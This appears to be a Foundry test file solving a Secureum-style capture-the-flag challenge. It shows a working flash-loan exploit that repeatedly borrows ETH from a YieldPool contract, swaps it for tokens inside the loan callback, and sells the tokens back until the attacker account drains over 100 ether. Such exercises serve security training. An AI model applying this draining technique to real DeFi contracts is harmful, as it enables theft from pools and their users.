// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract FlashLoanReceiver {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    YieldPool public yieldPool;
    SecureumToken token;

    constructor(address _yieldPool, address _token) {
        yieldPool = YieldPool(payable(_yieldPool));
        token = SecureumToken(_token);
    }

    // Flashloan callback.
    function onFlashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Use all ETH for buying Tokens while paying the loan.
        yieldPool.ethToToken{value: address(this).balance}();

        // Send Tokens to attacker account
        token.transfer(_receiver, token.balanceOf(address(this)));

        return CALLBACK_SUCCESS;
    }

    receive() external payable {}
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/

        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver(
            address(yieldPool),
            address(token)
        );

        while (address(attacker).balance < 100 ether) {
            // Transfer everything to the FlashLoanReceiver contract.
            payable(address(flashLoanReceiver)).transfer(
                address(attacker).balance
            );

            // Flashloan as much ETH as we can afford.
            yieldPool.flashLoan(
                IERC3156FlashBorrower(address(flashLoanReceiver)),
                yieldPool.ETH(),
                address(flashLoanReceiver).balance * 100,
                hex""
            );

            // Exchange Tokens for ETH.
            token.approve(
                address(yieldPool),
                token.balanceOf(address(attacker))
            );

            yieldPool.tokenToEth(token.balanceOf(address(attacker)));
        }

        //==================================================//
        vm.stopPrank();

        assertGt(
            address(attacker).balance,
            100 ether,
            "hacker should have more than 100 ether"
        );
    }
}
